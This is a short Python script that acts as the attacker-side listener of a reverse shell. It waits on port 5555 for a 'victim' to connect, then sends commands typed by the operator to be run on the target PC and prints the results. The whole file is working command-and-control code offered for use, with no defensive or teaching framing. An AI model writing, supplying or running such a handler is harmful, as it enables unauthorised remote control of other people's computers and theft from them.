import socket

HOST = '0.0.0.0'
PORT = 5555

# set up the socket for an incoming connection
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
print(f'[*] listening as {HOST}:{PORT}')

# waiting for the target and sent a welcome message if it connected
client_s, client_addr = s.accept()
print(f'[*]TETELFUWAL!(Victim connected!){client_addr}')
client_s.send('welcome'.encode())

# this loop will run, until you enter 'quit'
while True:

    # 1. enter the command and send it to the target
    cmd = input('selay> ')
    client_s.send(cmd.encode())

    # check if you want to quit
    if cmd.lower() == 'quit':
        break

    # get the result of the command, executed on the target pc
    result = client_s.recv(1024).decode()
    print(result)

client_s.close()
s.close()
